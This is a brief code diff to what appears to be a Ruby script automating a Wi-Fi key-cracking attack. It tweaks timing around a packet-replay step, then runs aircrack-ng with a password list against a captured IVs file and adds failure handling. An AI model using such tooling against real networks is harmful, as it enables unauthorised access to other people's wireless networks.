@@ -31,18 +31,22 @@ while again do
 				cleaner()
 				abort("\nAttack fail!")
 			end
-			sleep(1)
+			sleep(2)
 		end
 	end
 
 
 	pid = p.pid
-	n = 4
+	n = 5
 	sleep(n)
 	Process.kill("INT", pid)
 
-	a = `sudo aircrack-ng -w pass.lst replay-01.ivs`
-
+	if !system("sudo aircrack-ng -w pass.lst replay-01.ivs")
+		abort("\nCracker fail!")
+	else
+		a = `sudo aircrack-ng -w pass.lst replay-01.ivs`
+	end
+	
 	if a =~ /no data packets/
 		again = true
 	end
